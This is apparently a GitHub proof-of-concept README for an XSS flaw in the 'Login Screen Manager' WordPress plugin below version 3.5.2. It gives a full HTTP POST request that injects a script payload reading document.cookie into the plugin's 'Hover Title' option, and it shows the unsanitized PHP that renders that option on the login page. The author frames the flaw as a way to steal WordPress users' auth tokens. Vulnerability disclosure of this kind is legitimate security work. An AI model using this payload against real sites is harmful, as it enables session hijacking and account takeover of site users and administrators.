# Login-screen-manager-POC
Poc XSS screen login manager wordpress plugin

# Exploit Title: Login Screen Manager (Authenticated) (Reflected XSS)
# Google Dork: N/A
# Date: 2023/09/19
# Exploit Author: Nano
# Vendor Homepage: https://nihal.one/
# Software Link: https://wordpress.org/plugins/login-screen-manager/
# Version: < 3.5.2
# Tested on: Ubuntu 20.04
# CVE : N/A

Exploit
We can use Reflected XSS to exploit this vulnerability, create a
malicious link, and steal wordpress user auth tokens once a user logins


```sh
POST /wp-admin/options.php HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:8080/wp-admin/options-general.php?page=cwlsm-options
Content-Type: application/x-www-form-urlencoded
Content-Length: 594
Origin: http://localhost:8080

option_page=cwlsm_settings_group&action=update&_wpnonce=f66ab96767&_wp_http_referer=%2Fwp-admin%2Foptions-general.php%3Fpage%3Dcwlsm-options%26settings-updated%3Dtrue&cwlsm_settings%5Blogo_url%5D=&cwlsm_settings%5Bfav_icon_url%5D=&cwlsm_settings%5Bhover_title%5D=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&cwlsm_settings%5Burl%5D=&cwlsm_settings%5Bbody_bg_color%5D=%23F1F1F1&cwlsm_settings%5Blogin_form_bg_color%5D=%23FFFFFF&cwlsm_settings%5Btext_input_color%5D=%23000000&cwlsm_settings%5Binput_bg_color%5D=%23FFFFFF&cwlsm_settings%5Blabel_color%5D=%23000000&cwlsm_settings%5Bcss%5D=
```
As you can see we can submit a XSS payload in the "Hover Title" tag, reason being is that the submitted data isn't sanitized once it's loaded User login page

Vuln code:
```php
function cwlsm_change_title(){

                global $cwlsm_options;

                return  $cwlsm_options["hover_title"];

        }



        if(!empty($cwlsm_options["hover_title"])){

                add_action('login_headertitle', 'cwlsm_change_title');

        }```
